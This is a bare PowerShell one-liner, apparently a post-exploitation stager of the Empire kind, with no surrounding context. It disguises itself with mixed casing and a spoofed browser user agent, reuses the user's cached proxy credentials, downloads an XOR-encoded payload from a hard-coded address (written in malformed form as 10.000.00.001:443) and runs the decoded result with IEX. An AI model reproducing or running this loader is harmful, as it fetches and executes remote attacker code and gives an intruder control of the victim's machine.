$wC=New-ObJecT System.NEt.WEbCLient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaDERS.Add('User-Agent',$u);$Wc.PRoXy = [System.NeT.WebRequEst]::DEFaUltWEbProXY;$Wc.PrOXY.CredEntiALs = [SYStEm.NeT.CreDeNtiALCAChe]::DEfAUlTNeTworKCreDeNtIaLs;$K='B0)U:bM#zL=OK<QFN%,j5V~E/AYytC|';$I=0;[cHAR[]]$B=([cHaR[]]($Wc.DOWnLoadStriNg("http://10.000.00.001:443/index.asp")))|%{$_-BXOR$K[$I++%$K.LengtH]};IEX ($b-jOIN'')